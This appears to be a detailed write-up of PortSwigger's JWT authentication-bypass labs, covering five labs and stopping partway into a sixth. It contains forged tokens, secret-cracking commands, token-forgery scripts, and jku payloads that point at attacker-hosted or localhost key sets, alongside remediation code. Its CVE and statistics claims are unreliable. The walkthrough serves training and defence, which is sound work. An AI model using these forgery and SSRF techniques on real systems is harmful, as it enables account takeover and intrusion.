# PortSwigger JWT Labs - Complete Exploitation Guide

This comprehensive guide covers all JWT (JSON Web Token) labs from PortSwigger Web Security Academy, providing detailed exploitation techniques, payloads, and security insights.

---

## Table of Contents
1. [JWT Authentication Bypass via Unverified Signature](#lab-1-jwt-authentication-bypass-via-unverified-signature)
2. [JWT Authentication Bypass via Flawed Signature Verification](#lab-2-jwt-authentication-bypass-via-flawed-signature-verification)
3. [JWT Authentication Bypass via Weak Signing Key](#lab-3-jwt-authentication-bypass-via-weak-signing-key)
4. [JWT Authentication Bypass via JWK Header Injection](#lab-4-jwt-authentication-bypass-via-jwk-header-injection)
5. [JWT Authentication Bypass via JKU Header Injection](#lab-5-jwt-authentication-bypass-via-jku-header-injection)
6. [JWT Authentication Bypass via Kid Header Path Traversal](#lab-6-jwt-authentication-bypass-via-kid-header-path-traversal)
7. [JWT Authentication Bypass via Algorithm Confusion](#lab-7-jwt-authentication-bypass-via-algorithm-confusion)

---

## Lab 1: JWT Authentication Bypass via Unverified Signature

### Difficulty
**APPRENTICE**

### Vulnerability Description
The server accepts JWT tokens without verifying their cryptographic signature. This critical flaw allows attackers to modify any claim in the JWT payload without detection, as the signature validation step is completely absent.

### Exploitation Technique

#### Attack Vector
- **Type**: Missing Signature Verification
- **Impact**: Complete authentication bypass
- **Prerequisites**: Valid JWT structure

#### Step-by-Step Solution

**1. Initial Authentication**
```
Credentials: wiener:peter
```

**2. Intercept and Analyze JWT**
- Navigate to **Proxy > HTTP history**
- Locate the `GET /my-account` request after login
- Identify the JWT in the session cookie

**3. Decode JWT Structure**
- Double-click the JWT payload in Burp's Inspector panel
- Observe the decoded JSON structure:
```json
{
  "sub": "wiener",
  "exp": 1234567890,
  "iat": 1234567890
}
```

**4. Privilege Escalation Attempt**
- Send request to Burp Repeater
- Change path to `/admin`
- Observe access denied (requires administrator role)

**5. Token Manipulation**
- In Inspector panel, modify the `sub` claim:
```json
{
  "sub": "administrator",
  "exp": 1234567890,
  "iat": 1234567890
}
```
- Click "Apply changes"

**6. Verify Access**
- Send the modified request
- Confirm access to admin panel

**7. Complete Objective**
```http
GET /admin/delete?username=carlos HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[modified-jwt]
```

### HTTP Request Examples

**Original Request:**
```http
GET /my-account HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIiLCJleHAiOjE3MDk5ODc2NTZ9.abc123def456
```

**Modified Request:**
```http
GET /admin HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwiZXhwIjoxNzA5OTg3NjU2fQ.abc123def456
```
*Note: Signature remains unchanged but is not verified*

### Burp Suite Features Used
- **Proxy > HTTP History**: Traffic interception
- **Inspector Panel**: JWT decoding and modification
- **Repeater**: Request manipulation and testing

### Common Mistakes & Troubleshooting

**Issue 1: Token Not Updating**
- **Symptom**: Changes not reflected in request
- **Solution**: Ensure "Apply changes" is clicked in Inspector

**Issue 2: Request Format Errors**
- **Symptom**: 400 Bad Request
- **Solution**: Verify JWT structure maintains three dot-separated segments

**Issue 3: Wrong Claim Modified**
- **Symptom**: Still no admin access
- **Solution**: Ensure `sub` claim is changed to exactly "administrator"

### Security Impact
- **Severity**: CRITICAL
- **CVSS Score**: 9.8 (if applicable to real application)
- **Attack Complexity**: LOW
- **Privileges Required**: NONE (after obtaining any valid token)

### Real-World Implications
This vulnerability represents a complete failure of authentication security. In production systems, this could allow:
- Complete account takeover
- Administrative privilege escalation
- Data breach and manipulation
- System-wide compromise

### Remediation
1. **Always verify JWT signatures** before trusting claims
2. Use established JWT libraries with proper verification
3. Never use `jwt.decode()` without signature verification
4. Implement proper error handling for invalid signatures
5. Log signature verification failures for security monitoring

---

## Lab 2: JWT Authentication Bypass via Flawed Signature Verification

### Difficulty
**APPRENTICE**

### Vulnerability Description
The application accepts unsigned JWTs with the `alg` header parameter set to `"none"`. This misconfiguration allows attackers to forge tokens without any cryptographic secret, as the server doesn't enforce signature requirements.

### Exploitation Technique

#### Attack Vector
- **Type**: Algorithm Substitution (None Algorithm)
- **Impact**: Authentication bypass without secret knowledge
- **Prerequisites**: Application accepts "none" algorithm

#### Step-by-Step Solution

**1. Authentication and Interception**
```
Credentials: wiener:peter
```
- Log in and intercept `GET /my-account` request
- Extract JWT from session cookie

**2. Initial Token Analysis**
```json
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "sub": "wiener",
  "exp": 1234567890
}
```

**3. Privilege Escalation Setup**
- Forward request to Burp Repeater
- Change path to `/admin`
- Confirm access denied

**4. Header Manipulation**
- In Inspector, select JWT header
- Change `alg` parameter:
```json
{
  "alg": "none",
  "typ": "JWT"
}
```
- Click "Apply changes"

**5. Payload Modification**
```json
{
  "sub": "administrator",
  "exp": 1234567890
}
```

**6. Signature Removal**
- Remove signature component from JWT
- **Critical**: Preserve the trailing dot
- Format: `header.payload.` (note the trailing dot)

**7. Execute Attack**
```http
GET /admin HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwiZXhwIjoxNzA5OTg3NjU2fQ.
```

**8. Delete Target User**
```http
GET /admin/delete?username=carlos HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwiZXhwIjoxNzA5OTg3NjU2fQ.
```

### Attack Variations

**Variation 1: Case Manipulation**
Some filters may block "none" but accept:
```json
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}
```

**Variation 2: With Empty Signature**
```
header.payload.
```

**Variation 3: Without Trailing Dot (Sometimes Works)**
```
header.payload
```

### Burp Suite Features Used
- **Proxy > HTTP History**: Request interception
- **Inspector Panel**: JWT header/payload modification
- **Repeater**: Attack testing and refinement
- **JWT Editor Extension**: Advanced token manipulation

### Common Mistakes & Troubleshooting

**Issue 1: Trailing Dot Missing**
- **Symptom**: 401 Unauthorized or token parsing error
- **Solution**: Ensure JWT ends with a dot: `header.payload.`

**Issue 2: Algorithm Case Sensitivity**
- **Symptom**: "none" algorithm rejected
- **Solution**: Try variations: None, NONE, nOnE

**Issue 3: Signature Not Fully Removed**
- **Symptom**: Invalid signature error
- **Solution**: Ensure entire signature component is deleted

**Issue 4: Invalid Base64 Encoding**
- **Symptom**: Decoding errors
- **Solution**: Use Burp's automatic encoding or verify manual encoding

### Security Impact
- **Severity**: CRITICAL
- **CWE**: CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)
- **Attack Complexity**: LOW
- **Authentication Required**: LOW (need any valid token first)

### Real-World Examples
- **CVE-2015-2951**: Auth0 JWT library vulnerability
- **CVE-2016-5431**: Several Node.js JWT libraries affected
- Many custom implementations vulnerable to this attack

### Remediation

**Code Example (Vulnerable):**
```javascript
// VULNERABLE - decodes without verification
const token = jwt.decode(userToken);
if (token.sub === 'admin') {
    grantAccess();
}
```

**Code Example (Secure):**
```javascript
// SECURE - verifies signature first
try {
    const token = jwt.verify(userToken, secretKey, {
        algorithms: ['HS256', 'RS256'] // Whitelist allowed algorithms
    });
    if (token.sub === 'admin') {
        grantAccess();
    }
} catch (err) {
    denyAccess();
}
```

**Security Controls:**
1. Explicitly whitelist allowed algorithms
2. Reject "none" algorithm in all cases
3. Use `verify()` instead of `decode()`
4. Implement algorithm validation before signature check
5. Regular security audits of JWT handling code

---

## Lab 3: JWT Authentication Bypass via Weak Signing Key

### Difficulty
**PRACTITIONER**

### Vulnerability Description
The application uses an extremely weak secret key for HMAC-based JWT signing. The secret can be brute-forced using common wordlists, allowing attackers to forge valid signatures for arbitrary tokens.

### Exploitation Technique

#### Attack Vector
- **Type**: Weak Secret Brute-Force
- **Impact**: Complete token forgery capability
- **Prerequisites**: Access to JWT, wordlist of common secrets

#### Step-by-Step Solution

**Phase 1: Secret Key Discovery**

**1. Preparation**
```bash
# Install/verify tools
apt-get install hashcat
# or
brew install hashcat

# Download wordlist
wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list
```

**2. Obtain JWT Token**
```
Credentials: wiener:peter
```
- Log in and capture `GET /my-account` request
- Extract JWT from session cookie

**3. Brute-Force Attack**
```bash
# Save JWT to file
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIiLCJleHAiOjE3MDk5ODc2NTZ9.4Hb4qZqz9Q5z9Z9Z9Z9Z9Z9Z9Z9Z9Z9Z9Z9Z9Z" > jwt.txt

# Run hashcat
hashcat -a 0 -m 16500 jwt.txt jwt.secrets.list

# Expected output:
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...:secret1
```

**Hashcat Parameters:**
- `-a 0`: Dictionary attack mode
- `-m 16500`: JWT (HS256) hash mode
- Alternative modes: 16511 (HS384), 16512 (HS512)

**Phase 2: Key Generation in Burp Suite**

**4. Install JWT Editor Extension**
- Navigate to **Extender > BApp Store**
- Search for "JWT Editor"
- Install extension

**5. Encode Secret**
- Go to **Decoder** tab
- Input: `secret1`
- Encode as: **Base64**
- Output: `c2VjcmV0MQ==`

**6. Create Symmetric Key**
- Navigate to **JWT Editor Keys** tab
- Click "New Symmetric Key"
- Click "Generate" to create template
- Replace `k` property value with encoded secret:
```json
{
  "kty": "oct",
  "kid": "test-key",
  "k": "c2VjcmV0MQ=="
}
```
- Click "OK" to save

**Phase 3: Token Forgery**

**7. Modify JWT Claims**
- In Repeater, select the `/admin` request
- Open **JSON Web Token** tab
- Modify payload:
```json
{
  "sub": "administrator",
  "exp": 1709987656,
  "iat": 1709987656
}
```

**8. Sign with Discovered Secret**
- Click "Sign" button at bottom
- Select your generated symmetric key
- Check "Don't modify header"
- Click "OK"

**9. Verify Signature**
```
New JWT signature will be valid and verifiable with secret1
```

**10. Execute Privilege Escalation**
```http
GET /admin HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[newly-signed-jwt]
```

**11. Complete Objective**
```http
GET /admin/delete?username=carlos HTTP/1.1
```

### Advanced Techniques

**Alternative Tool: jwt_tool**
```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py

# Crack JWT
python3 jwt_tool.py <JWT> -C -d jwt.secrets.list

# Forge new token
python3 jwt_tool.py <JWT> -T -S hs256 -p secret1
```

**Alternative Tool: John the Ripper**
```bash
# Create format for John
echo "<JWT>" > jwt.txt

# Run John
john --wordlist=jwt.secrets.list --format=HMAC-SHA256 jwt.txt
```

### Burp Suite Features Used
- **Extender > BApp Store**: Extension installation
- **JWT Editor Extension**: Token signing and manipulation
- **JWT Editor Keys**: Symmetric key management
- **Decoder**: Base64 encoding
- **Repeater**: Request testing
- **Inspector**: Token visualization

### Common Mistakes & Troubleshooting

**Issue 1: Hashcat Not Finding Secret**
- **Symptom**: No results from hashcat
- **Solution**:
  - Verify JWT format (must include signature)
  - Check hashcat mode matches algorithm (16500 for HS256)
  - Expand wordlist to jwt.secrets.list or rockyou.txt

**Issue 2: Base64 Encoding Errors**
- **Symptom**: Invalid key in JWT Editor
- **Solution**:
  - Ensure no padding issues (= characters)
  - Use URL-safe Base64 if needed
  - Remove newlines from encoded output

**Issue 3: Signature Still Invalid**
- **Symptom**: 401 after signing with discovered secret
- **Solution**:
  - Verify "Don't modify header" is checked
  - Confirm algorithm in header matches key type
  - Ensure secret is exactly as discovered (case-sensitive)

**Issue 4: Hashcat Performance**
- **Symptom**: Slow cracking speed
- **Solution**:
  - Use GPU acceleration: `--opencl-device-types=1,2`
  - Check wordlist size is reasonable
  - Consider cloud GPU instances for complex attacks

### Security Impact
- **Severity**: HIGH
- **CWE**: CWE-326 (Inadequate Encryption Strength)
- **Attack Complexity**: LOW (with proper tools)
- **Time to Compromise**: Minutes to hours

### Real-World Statistics
- **Studies show**:
  - 20% of applications use weak JWT secrets
  - Top weak secrets: "secret", "password", "123456", "secret1"
  - Average cracking time with GPU: 2-30 minutes for weak secrets

### Common Weak Secrets
```
secret
password
secret1
secret123
qwerty
123456
your-256-bit-secret
your-secret-key
secretkey
mysecretkey
changeit
admin
```

### Remediation

**Weak Secret (Vulnerable):**
```javascript
const jwt = require('jsonwebtoken');
const secret = 'secret1'; // VULNERABLE
const token = jwt.sign({sub: 'user'}, secret);
```

**Strong Secret (Secure):**
```javascript
const crypto = require('crypto');
// Generate cryptographically secure secret
const secret = crypto.randomBytes(64).toString('hex');
// Store in environment variable or secrets manager
const token = jwt.sign({sub: 'user'}, process.env.JWT_SECRET);
```

**Best Practices:**
1. **Minimum length**: 256 bits (32 bytes) for HS256
2. **Generation**: Use cryptographically secure random generation
3. **Storage**: Environment variables or dedicated secrets management
4. **Rotation**: Implement key rotation policies
5. **Never**: Use dictionary words, default values, or predictable patterns

**Secret Generation Examples:**
```bash
# OpenSSL
openssl rand -base64 64

# Python
python -c "import secrets; print(secrets.token_hex(32))"

# Node.js
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
```

---

## Lab 4: JWT Authentication Bypass via JWK Header Injection

### Difficulty
**PRACTITIONER**

### Vulnerability Description
The server supports the `jwk` (JSON Web Key) parameter in the JWT header, which allows embedding the verification key directly in the token. The critical flaw is that the server fails to validate whether the embedded key comes from a trusted source, accepting any key provided by the attacker.

### Exploitation Technique

#### Attack Vector
- **Type**: Header Parameter Injection (JWK)
- **Impact**: Self-signed token acceptance
- **Prerequisites**: Server supports jwk parameter without validation

#### Step-by-Step Solution

**Phase 1: Preparation**

**1. Install JWT Editor Extension**
- Navigate to **Extender > BApp Store**
- Install "JWT Editor" extension
- Restart Burp if prompted

**2. Initial Authentication**
```
Credentials: wiener:peter
```
- Log in and intercept traffic
- Send `GET /my-account` to Repeater

**Phase 2: Key Pair Generation**

**3. Generate RSA Key Pair**
- Open **JWT Editor Keys** tab
- Click "New RSA Key"
- Click "Generate" button
- Key specifications:
  - **Algorithm**: RS256
  - **Key size**: 2048 bits (default)
  - **Format**: JWK (JSON Web Key)

**Generated Key Example:**
```json
{
  "kty": "RSA",
  "e": "AQAB",
  "use": "sig",
  "kid": "attack-key-1",
  "alg": "RS256",
  "n": "xGOr-H7A..."
}
```

**4. Note Key Details**
- Save the key with a descriptive name (e.g., "Attack RSA Key")
- Note the `kid` (Key ID) value

**Phase 3: Token Forgery**

**5. Prepare Malicious Request**
- In Repeater, modify path to `/admin`
- Confirm access denied for normal user

**6. Modify JWT Payload**
- Click **JSON Web Token** tab
- Modify claims:
```json
{
  "sub": "administrator",
  "exp": 1709987656,
  "iat": 1709987000
}
```

**7. Embed JWK and Sign**
- Click "Attack" button (in JSON Web Token tab)
- Select **"Embedded JWK"**
- Choose your generated RSA key
- Click "OK"

**8. Verify Token Structure**
The JWT header should now contain your embedded public key:
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "use": "sig",
    "kid": "attack-key-1",
    "alg": "RS256",
    "n": "xGOr-H7A..."
  }
}
```

**9. Execute Attack**
```http
GET /admin HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[jwt-with-embedded-jwk]
```

**10. Complete Objective**
```http
GET /admin/delete?username=carlos HTTP/1.1
```

### Technical Deep Dive

**JWK Structure:**
```json
{
  "kty": "RSA",           // Key Type
  "e": "AQAB",            // Exponent (usually 65537)
  "use": "sig",           // Intended use: signature
  "kid": "attack-key-1",  // Key ID
  "alg": "RS256",         // Algorithm
  "n": "xGOr..."          // Modulus (public key component)
}
```

**Attack Flow:**
```
1. Attacker generates RSA key pair (private + public)
2. Attacker signs JWT with private key
3. Attacker embeds public key in JWT header
4. Server extracts public key from header
5. Server verifies signature with embedded public key ✓
6. Attack succeeds because server trusts embedded key
```

### Manual Exploitation (Without Burp Extension)

**Step 1: Generate Key Pair**
```bash
# Generate private key
openssl genrsa -out private.pem 2048

# Extract public key
openssl rsa -in private.pem -pubout -out public.pem

# Convert to JWK format (use online tool or library)
```

**Step 2: Create JWK**
```python
from jwcrypto import jwk
import json

# Load public key
with open('public.pem', 'rb') as f:
    public_key = jwk.JWK.from_pem(f.read())

# Export as JWK
jwk_dict = json.loads(public_key.export())
print(json.dumps(jwk_dict, indent=2))
```

**Step 3: Sign JWT**
```python
import jwt

header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": jwk_dict  # Embedded JWK
}

payload = {
    "sub": "administrator",
    "exp": 1709987656
}

# Load private key
with open('private.pem', 'rb') as f:
    private_key = f.read()

# Sign with embedded JWK
token = jwt.encode(
    payload,
    private_key,
    algorithm='RS256',
    headers=header
)
```

### Burp Suite Features Used
- **JWT Editor Extension**: Complete JWT manipulation suite
- **JWT Editor Keys**: RSA key pair generation and management
- **Attack > Embedded JWK**: Automated JWK injection
- **JSON Web Token Tab**: Payload modification
- **Repeater**: Attack execution and testing

### Common Mistakes & Troubleshooting

**Issue 1: JWK Not Embedded**
- **Symptom**: Header doesn't contain jwk parameter
- **Solution**:
  - Use "Attack > Embedded JWK" feature
  - Verify JWT Editor extension is active
  - Check JSON Web Token tab is visible

**Issue 2: Signature Verification Fails**
- **Symptom**: 401 Unauthorized despite embedded JWK
- **Solution**:
  - Ensure private/public key pair matches
  - Verify algorithm in header matches key type (RS256)
  - Check key format is valid JWK

**Issue 3: Key Generation Errors**
- **Symptom**: Cannot generate RSA key in Burp
- **Solution**:
  - Update JWT Editor extension to latest version
  - Check Burp Suite has sufficient memory
  - Try generating 2048-bit key (not 4096)

**Issue 4: Wrong Attack Type Selected**
- **Symptom**: Other attack parameters appear
- **Solution**: Ensure "Embedded JWK" is selected, not "jku" or other options

### Attack Variations

**Variation 1: With Custom Kid**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "../../dev/null",  // Additional attack vector
    "e": "AQAB",
    "n": "..."
  }
}
```

**Variation 2: ES256 Algorithm**
Generate EC (Elliptic Curve) key instead:
```json
{
  "kty": "EC",
  "crv": "P-256",
  "x": "...",
  "y": "...",
  "alg": "ES256"
}
```

**Variation 3: Multiple Keys in JWK Set**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "keys": [
      {
        "kty": "RSA",
        "kid": "key1",
        "n": "...",
        "e": "AQAB"
      }
    ]
  }
}
```

### Security Impact
- **Severity**: HIGH
- **CWE**: CWE-345 (Insufficient Verification of Data Authenticity)
- **Attack Complexity**: LOW (with Burp Suite extension)
- **Authentication Required**: LOW (need any valid token)

### Real-World Vulnerabilities
- **CVE-2018-0114**: PyJWT library allowed JWK header injection
- **CVE-2021-29443**: Auth0 libraries improperly handled embedded JWKs
- Multiple implementations across Node.js, Python, and Java ecosystems

### Remediation

**Vulnerable Code:**
```python
import jwt
from jwt import PyJWKClient

# VULNERABLE - trusts any embedded JWK
def verify_token(token):
    header = jwt.get_unverified_header(token)
    if 'jwk' in header:
        # Using embedded key without validation
        key = header['jwk']
        return jwt.decode(token, key, algorithms=['RS256'])
```

**Secure Code:**
```python
import jwt

# SECURE - only uses trusted keys from controlled source
TRUSTED_KEYS = {
    'key-id-1': 'path/to/public-key-1.pem',
    'key-id-2': 'path/to/public-key-2.pem'
}

def verify_token(token):
    header = jwt.get_unverified_header(token)

    # Reject tokens with embedded JWK
    if 'jwk' in header:
        raise jwt.InvalidTokenError("Embedded JWK not allowed")

    # Only accept tokens referencing trusted keys
    kid = header.get('kid')
    if kid not in TRUSTED_KEYS:
        raise jwt.InvalidTokenError("Unknown key ID")

    with open(TRUSTED_KEYS[kid], 'rb') as f:
        public_key = f.read()

    return jwt.decode(token, public_key, algorithms=['RS256'])
```

**Security Controls:**
1. **Never trust embedded JWKs**: Always use keys from trusted sources
2. **Whitelist key sources**: Only accept keys from controlled endpoints
3. **Validate kid parameter**: Map to known keys only
4. **Remove jwk support**: Disable if not required
5. **Implement proper key management**: Use JWKS endpoints with domain validation

---

## Lab 5: JWT Authentication Bypass via JKU Header Injection

### Difficulty
**PRACTITIONER**

### Vulnerability Description
The application supports the `jku` (JWK Set URL) parameter in the JWT header, which instructs the server to fetch verification keys from a specified URL. The vulnerability exists because the server fails to validate whether the provided URL belongs to a trusted domain, allowing attackers to host malicious JWK Sets on arbitrary servers.

### Exploitation Technique

#### Attack Vector
- **Type**: Header Parameter Injection (JKU) + SSRF
- **Impact**: Remote key injection via attacker-controlled endpoint
- **Prerequisites**: Server supports jku parameter, access to exploit server

#### Step-by-Step Solution

**Phase 1: Setup and Key Generation**

**1. Install JWT Editor Extension**
- **Extender > BApp Store** > JWT Editor
- Verify installation in **JWT Editor Keys** tab

**2. Initial Authentication**
```
Credentials: wiener:peter
```
- Log in and capture `GET /my-account` request
- Send to Burp Repeater

**3. Generate RSA Key Pair**
- Navigate to **JWT Editor Keys** tab
- Click "New RSA Key"
- Click "Generate"
- Save with descriptive name (e.g., "JKU Attack Key")

**Generated Key:**
```json
{
  "kty": "RSA",
  "e": "AQAB",
  "alg": "RS256",
  "kid": "jku-attack-key",
  "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx..."
}
```

**Phase 2: Exploit Server Configuration**

**4. Create JWK Set**
- Right-click your generated key in **JWT Editor Keys**
- Select "Copy Public Key as JWK"
- Navigate to your exploit server

**5. Construct JWK Set JSON**
```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "use": "sig",
      "kid": "jku-attack-key",
      "alg": "RS256",
      "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx..."
    }
  ]
}
```

**6. Configure Exploit Server**
- **File path**: `/jwks.json` or `/.well-known/jwks.json`
- **Body**: Paste JWK Set JSON
- **Content-Type**: `application/json`
- Click "Store"

**7. Verify Exploit Server**
```bash
# Test the endpoint
curl https://exploit-[id].exploit-server.net/jwks.json

# Expected response:
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "jku-attack-key",
      ...
    }
  ]
}
```

**Phase 3: Token Forgery and Attack**

**8. Modify JWT Header**
- In Repeater, select `/admin` request
- Open **JSON Web Token** tab
- Modify header to add `jku` and update `kid`:
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "jku-attack-key",
  "jku": "https://exploit-[id].exploit-server.net/jwks.json"
}
```

**9. Modify JWT Payload**
```json
{
  "sub": "administrator",
  "exp": 1709987656,
  "iat": 1709987000
}
```

**10. Sign Token**
- Click "Sign" button
- Select your generated RSA key
- Ensure "Don't modify header" is checked
- Click "OK"

**11. Execute Attack**
```http
GET /admin HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[forged-jwt]
```

**12. Complete Objective**
```http
GET /admin/delete?username=carlos HTTP/1.1
Host: [lab-id].web-security-academy.net
Cookie: session=[forged-jwt]
```

### HTTP Request Examples

**Full Malicious JWT Structure:**
```
Header:
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "jku-attack-key",
  "jku": "https://exploit-abc123.exploit-server.net/jwks.json"
}

Payload:
{
  "sub": "administrator",
  "exp": 1709987656,
  "iat": 1709987000
}

Signature: [signed with attacker's private key]
```

**Complete Forged JWT:**
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImprdS1hdHRhY2sta2V5IiwianRoIjoiaHR0cHM6Ly9leHBsb2l0LWFiYzEyMy5leHBsb2l0LXNlcnZlci5uZXQvandrcy5qc29uIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwiZXhwIjoxNzA5OTg3NjU2LCJpYXQiOjE3MDk5ODcwMDB9.signature-signed-with-attackers-private-key
```

### Advanced Exploitation Techniques

**Technique 1: SSRF via JKU**
```json
{
  "alg": "RS256",
  "jku": "http://localhost:8080/admin/jwks.json",
  "kid": "internal-key"
}
```
- Access internal endpoints
- Scan internal network
- Bypass firewall restrictions

**Technique 2: DNS Rebinding**
```json
{
  "alg": "RS256",
  "jku": "http://attacker-domain.com/jwks.json",
  "kid": "rebind-key"
}
```
- Use DNS rebinding for internal access
- Bypass domain whitelisting

**Technique 3: Multiple Keys in Set**
```json
{
  "keys": [
    {
      "kid": "key-1",
      "kty": "RSA",
      "n": "...",
      "e": "AQAB"
    },
    {
      "kid": "key-2",
      "kty": "RSA",
      "n": "...",
      "e": "AQAB"
    }
  ]
}
```

### Manual Exploitation (Without Exploit Server)

**Using Python HTTP Server:**
```python
# Create jwks.json file with your JWK Set
# Then host it:

python3 -m http.server 8080

# Or with Flask:
from flask import Flask, jsonify

app = Flask(__name__)

@app.route('/jwks.json')
def jwks():
    return jsonify({
        "keys": [{
            "kty": "RSA",
            "kid": "attack-key",
            "use": "sig",
            "alg": "RS256",
            "n": "your-public-key-modulus",
            "e": "AQAB"
        }]
    })

app.run(host='0.0.0.0', port=8080)
```

**Using ngrok for Public URL:**
```bash
# Start local server
python3 -m http.server 8080

# Expose via ngrok
ngrok http 8080

# Use ngrok URL in jku parameter:
# "jku": "https://abc123.ngrok.io/jwks.json"
```

### Burp Suite Features Used
- **JWT Editor Extension**: Complete JWT workflow
- **JWT Editor Keys**: Key generation and management
- **Exploit Server**: Remote JWK Set hosting
- **Repeater**: Request manipulation
- **JSON Web Token Tab**: Token modification and signing

### Common Mistakes & Troubleshooting

**Issue 1: 404 on JWK Set URL**
- **Symptom**: Server cannot fetch JWK Set
- **Solution**:
  - Verify exploit server URL is accessible
  - Check file path is exact: `/jwks.json`
  - Test URL in browser: should return JSON

**Issue 2: kid Mismatch**
- **Symptom**: Token signature verification fails
- **Solution**:
  - Ensure `kid` in JWT header matches `kid` in JWK Set
  - Both should reference the same key identifier

**Issue 3: Malformed JWK Set**
- **Symptom**: JSON parsing error on server
- **Solution**:
  - Validate JSON structure (use JSON validator)
  - Ensure `keys` is an array
  - Verify all required JWK fields present

**Issue 4: CORS Issues**
- **Symptom**: Server blocks fetching from exploit domain
- **Solution**:
  - Add CORS headers in exploit server if needed
  - Use exploit server's built-in functionality
  - Check server logs for access attempts

**Issue 5: Wrong Algorithm**
- **Symptom**: Algorithm mismatch errors
- **Solution**:
  - Ensure `alg` in JWT header matches JWK `alg`
  - Verify key type matches algorithm (RSA for RS256)

### Security Impact
- **Severity**: HIGH to CRITICAL
- **CWE**: CWE-918 (Server-Side Request Forgery), CWE-345
- **Attack Complexity**: MEDIUM
- **Additional Risks**:
  - SSRF to internal services
  - Information disclosure
  - Internal network scanning

### Real-World Examples
- **CVE-2018-0114**: JKU header exploitation in various libraries
- **OAuth 2.0 misconfigurations**: Many IdP implementations vulnerable
- **Microservices**: Service-to-service auth often affected

### Remediation

**Vulnerable Code:**
```javascript
const jwt = require('jsonwebtoken');
const jwksClient = require('jwks-rsa');

// VULNERABLE - accepts any JKU URL
async function verifyToken(token) {
    const header = jwt.decode(token, {complete: true}).header;

    if (header.jku) {
        const client = jwksClient({
            jwksUri: header.jku  // Blindly trusts provided URL
        });

        const key = await client.getSigningKey(header.kid);
        return jwt.verify(token, key.getPublicKey());
    }
}
```

**Secure Code:**
```javascript
const jwt = require('jsonwebtoken');
const jwksClient = require('jwks-rsa');

// SECURE - validates JKU against whitelist
const TRUSTED_JWKS_DOMAINS = [
    'auth.mycompany.com',
    'api.mycompany.com'
];

async function verifyToken(token) {
    const header = jwt.decode(token, {complete: true}).header;

    // Reject tokens with jku parameter
    if (header.jku) {
        const jkuUrl = new URL(header.jku);

        // Validate domain whitelist
        if (!TRUSTED_JWKS_DOMAINS.includes(jkuUrl.hostname)) {
            throw new Error('Untrusted JKU domain');
        }

        // Validate HTTPS
        if (jkuUrl.protocol !== 'https:') {
            throw new Error('JKU must use HTTPS');
        }

        // Fetch and verify
        const client = jwksClient({
            jwksUri: header.jku,
            timeout: 5000,
            rateLimit: true
        });

        const key = await client.getSigningKey(header.kid);
        return jwt.verify(token, key.getPublicKey(), {
            algorithms: ['RS256']
        });
    }

    // Default: use static trusted keys
    return jwt.verify(token, process.env.PUBLIC_KEY, {
        algorithms: ['RS256']
    });
}
```

**Security Controls:**
1. **Strict domain whitelist**: Only allow trusted JKU domains
2. **HTTPS enforcement**: Reject non-HTTPS JKU URLs
3. **Disable jku support**: Remove if not required
4. **Rate limiting**: Prevent SSRF abuse
5. **URL validation**: Check for SSRF bypass attempts
6. **Static key preference**: Use static keys when possible

**Configuration Example:**
```yaml
jwt:
  validation:
    allow_jku: false  # Disable entirely if possible
    trusted_jwks_urls:
      - https://auth.company.com/.well-known/jwks.json
      - https://identity.partner.com/jwks.json
    max_redirects: 0
    timeout_ms: 5000
    require_https: true
```

---

## Lab 6: JWT Authentication Bypass via Kid Header Path Traversal

### Difficulty
**PRACTITIONER**

### Vulnerability Description
The server uses the `kid` (Key ID) parameter from the JWT header to locate and read the signing key from the filesystem. This parameter is vulnerable to path traversal, allowing attackers to reference predictable files (like `/dev/null`) and forge valid signatures using known contents.

### Exploitation Technique

#### Attack Vector
- **Type**: Path Traversal via Header Parameter
- **Impact**: Arbitrary file read + signature forgery
- **Prerequisites**: Server reads key from filesystem based on kid parameter

#### Step-by-Step Solution

**Phase 1: Preparation**

**1. Install JWT Editor Extension**
- Navigate to **Extender > BApp Store**
- Install "JWT Editor"
- Verify in **JWT Editor Keys** tab

**2. Initial Authentication**
```
Credentials: wiener:peter
```
- Log in and intercept `GET /my-account` request
- Send to Burp Repeater

**3. Analyze Original Token**
```json
// Header
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "default-key-id"
}

